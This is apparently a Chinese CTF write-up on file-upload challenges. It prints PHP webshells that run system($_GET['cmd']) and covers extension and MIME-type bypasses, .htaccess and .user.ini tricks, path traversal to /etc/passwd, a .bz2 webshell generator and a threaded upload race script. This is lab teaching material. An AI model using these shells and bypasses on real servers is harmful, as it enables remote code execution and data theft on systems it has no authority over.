---

title: 青岑CTF文件上传WP
date: 2026-07-21
categories: ["CTF-Writeups","青岑CTF-WP集"]
permalink: /ctf-writeups/ctf-file-upload
---


# 1.EZFU
怎么说呢？按照以前的习惯，靶场的难度应该是逐级递增的，于是直接上传一个一句话木马
```bash
<?php
system($_GET['cmd']);
phpinfo();
?>
``` 
上传成功后，直接使用命令
```bash
/?cmd=env;
```
# 2.EZFU1
直接上传.php 显示只允许上传图片文件！(jpg, png, gif, webp)
前端校验了，直接禁用JavaScript，于是就上传成功了，
```bash
<?php
system($_GET['cmd']);
phpinfo();
?>
``` 
还是上传这个，执行这个
```bash
/?cmd=env;
```
方法好多，就讲最简单的吧！！！
# 3.EZFU2
继续上传.php结果回显{"success":false,"message":"File type not allowed"}
.php被过滤了，大小写绕过和双写绕过貌似都不行，最后找到.phtml可以上传成功，
```bash
<?php
system($_GET['cmd']);
phpinfo();
?>
```
执行
```bash
/?cmd=env;
```
# 4.EZFU3
先试了上一题的方法，回显{"success":false,"message":"MIME type not allowed"}，说明文件类型不允许，于是我上传了一张正常的图片可以上传，所以我就上传了一个图片马，抓包改后缀为.php，但是php好像被过滤了，还是和上一题一样，改成.phtml，就上传成功了，执行
```bash
/?cmd=env;
```
回显了phpinfo（）；直接在页面搜flag就行了。
# 5.EZFU4
有了上一题的经验，我直接就上传了一个图片马，结果页面回显了{"success":false,"message":"File content not allowed: PHP tags detected"}翻译过来就是**文件内容不被允许，因为检测到了 PHP 标签**。简单说就是php被过滤了，依旧使用phtml，不过图片马里面的php也不能有，所以我尝试了pphphp，不过也不行，可以使用
```bash
<?=
phpinfo();
system($_GET['cmd']);
?>
```
在页面搜索flag，就行了。
# 5.EZFU5
和上一题开始一样，页面回显{"success":false,"message":"File content not allowed: PHP tags detected"}翻译过来就是**文件内容不被允许，因为检测到了 PHP 标签**。反正很奇怪，和上一题步骤一样。
# 7.EZFU6
和上一题开始一样，不过这次页面回显的内容不同{"success":false,"message":"File content not allowed: dangerous function detected"}翻译过来就是**文件内容不允许：检测到危险函数**
我的图片马里面是有system（）的，所以我索性就把这个函数删了，直接执行phpinfo()；在页面直接搜flag就行了。
# 8.EZFU7
和上一题就不一样了，上传后回显JSON.parse: unexpected character at line 1 column 1 of the JSON data，php被过滤了，而且代码也不能被解析和执行。所以我们可以上传一个.htaccess，它可以通过`SetHandler`指令，强制服务器将任意指定文件当作PHP脚本来执行。不过直接上传页面回显{"success":false,"message":"MIME type not allowed"}显示文件类型不符合要求，所以改文件类型为image/png就行，之后在相同的文件下上传一个图片马，因为php被过滤了，所以还是需要绕过一下的
```bash
<?=
phpinfo();
?>
```
直接在页面搜索flag就行
# 9.EZFU8
既然.htaccess都出来了，相比这题应该就是.user.ini，于是上传，不过显示文件类型不符合，所以还是换成image/png。上传成功后，就上传.user.ini里面写的文件，和之前一样，php被过滤了，直接绕过就行。上传带有php代码的文件过后，直接访问.user.ini的目录就行了，php代码会直接执行。
# 10.EZFU9
点击下方的员工入口即可以得到登录页面，账号已经告诉你了，就是admin，不过给了提示：口令沿用旧系统账号规则，资料仍在 /etc 目录归档。查看网页源代码发现传入的get参数是doc，所以直接构造（?doc=../../../../etc/passwd）往下翻就能看到admin:x:1001:1001:pass=cXZY0h3QhXs3:/ 经过验证，cXZY0h3QhXs3就是登录密码。进入文件上传界面后，显示要上传一个.bz2的文件，不过目前主流的压缩软件貌似都不支持把文件压缩成.bz2的压缩包，可以让ai写一个可以压缩.bz2的脚本
```bash
#!/usr/bin/env python3
import bz2
import os

def generate_bz2_shell(output_file="shell.php.bz2"):
    """
    生成一个包含一句话木马的 .bz2 压缩文件
    
    木马内容: <?php phpinfo(); system($_GET['zjz']); ?>
    """
    # 一句话木马源码（注意使用单引号避免转义问题）
    shell_content = """<?php
phpinfo();
system($_GET['zjz']);
?>"""
    
    # 使用 bz2 压缩数据
    compressed_data = bz2.compress(shell_content.encode('utf-8'))
    
    # 写入 .bz2 文件
    with open(output_file, 'wb') as f:
        f.write(compressed_data)
    
    # 获取文件大小供显示
    file_size = os.path.getsize(output_file)
    print(f"[+] 成功生成: {output_file}")
    print(f"[+] 原始大小: {len(shell_content)} 字节")
    print(f"[+] 压缩后大小: {file_size} 字节")
    print(f"[+] 木马内容:")
    print(shell_content)

if __name__ == "__main__":
    generate_bz2_shell()
    print("\n[提示] 使用方式: 解压后上传至服务器，参数为 ?zjz=命令")
```
也可以使用linux命令来压缩，前提是电脑有wsl的环境。
上传成功后，访问上传的地址，就可以在页面搜索flag了。
# 11.EZFU10
上来就是一个登陆界面，原本以为和上一题一样，结果啥也不是，只能试试弱口令了，刚好密码就是123456，然后就登陆进来了，上传了和上一题一样的.bz2不过这一次回显的是php不允许，显然是php被过滤了，继续使用之前的短标签.phtml，上传成功了，在页面搜索flag就行了。
# 12.EZFU11
嘶，上传一句话木马竟然能上传成功？？？？？不过访问时是404
哪应该是条件竞争了，直接先上传一个shell.php，然后再bp里面再抓一次包，发送到
intruder模块，连续发送包来和前面的包竞争，然后查看uplouds/shell.php,就能看见flag了
![](/images/20260424192134.webp)
# 13.EZFU12
和上一题一样，不过返回的文件名称变成了随机的UUID，这题属于多线程并发竞争，最优的解法就是用脚本来代替手测。
```bash
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://docker.qingcen.net:44202/"//目标网站
PAYLOAD = b"<?php system('cat /flag');?>"
STOP = threading.Event()

def worker():
    with requests.Session() as s:
        while not STOP.is_set():
            try:
                r = s.post(
                    f"{BASE_URL}/",
                    files={"image": ("shell.php", PAYLOAD, "application/x-php")},
                    timeout=3,
                )
                path = r.json().get("file_url")
                if not path:
                    continue

                text = s.get(f"{BASE_URL}/{path.lstrip('/')}", timeout=3).text.strip()
                if text.startswith("flag{") and text.endswith("}"):
                    STOP.set()
                    return text
            except (requests.RequestException, ValueError):
                pass

def main():
    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = [pool.submit(worker) for _ in range(20)]
        for f in as_completed(futures):
            flag = f.result()
            if flag:
                print(flag)
                return

if __name__ == "__main__":
    main()
```
该脚本适合**返回路径型"条件竞争。

